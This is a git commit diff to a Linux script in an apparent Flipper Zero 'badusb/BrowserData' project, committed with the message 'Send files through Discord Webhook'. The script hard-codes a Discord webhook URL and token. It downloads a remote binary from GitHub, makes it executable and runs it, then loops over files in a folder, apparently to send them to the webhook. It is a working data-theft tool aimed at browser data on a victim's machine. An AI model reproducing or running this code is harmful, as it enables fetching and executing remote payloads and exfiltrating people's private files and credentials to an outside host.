9f442286e687cbf11f009f3937deb3a00a0d9c55
Chris <christophe.da.cruz.tic@gmail.com>
2023-12-09 12:36:36 +0100

    Send files through Discord Webhook

--- badusb/BrowserData/discord_wh_linux.sh
+++ badusb/BrowserData/discord_wh_linux.sh
@@ -1,14 +1,15 @@
 export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTFSYUStv8nitmhmXn_nJzOTdCY84f7YhNOhbXtkSm-5ERSGWk4Bsey8oxvrDJpx"
 architecture=$(uname -m)
 
+folder_path="/~"
+declare -a files=()
+
 if [ "$architecture" == "armv7l" ]; then
     echo "L'architecture est ARM."
 elif [ "$architecture" == "x86_64" ]; then
     curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64 -o test_script.sh
     chmod +x test_script.sh
     ./test_script.sh
-    folder_path="/~"
-    declare -a files=()
     shopt -s nullglob
     for fichier in "$folder_path"/*; do
         if [[ -f "$fichier" ]]; then
